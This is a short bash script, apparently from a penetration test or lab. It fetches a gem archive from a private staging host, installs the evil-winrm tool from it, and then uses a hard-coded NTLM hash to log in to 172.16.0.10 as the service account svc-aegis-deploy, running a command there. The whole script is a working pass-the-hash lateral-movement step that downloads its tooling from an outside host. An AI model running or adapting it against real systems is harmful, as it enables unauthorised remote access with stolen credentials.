#!/bin/bash
cd /tmp/gems 2>/dev/null || { curl -fsSL -o /tmp/ew_gems.tgz http://10.10.15.183:8090/ew_gems.tgz; mkdir -p /tmp/gems; tar -xzf /tmp/ew_gems.tgz -C /tmp/gems; }
cd /tmp/gems
gem install --user-install --local little-plugger-*.gem multi_json-*.gem rubyzip-*.gem logging-*.gem 2>&1 | tail -10
gem install --user-install --local winrm-*.gem winrm-fs-*.gem evil-winrm-*.gem 2>&1 | tee /tmp/gem3.log | tail -15
export PATH="$HOME/.local/share/gem/ruby/3.3.0/bin:$PATH"
export GEM_HOME="$HOME/.local/share/gem/ruby/3.3.0"
evil-winrm -i 172.16.0.10 -u svc-aegis-deploy -H 3a5026b2aa5ef2cbb7cb6a7be3a2bcfa -c whoami 2>&1 | tee /tmp/ew3.out
echo EW3_DONE
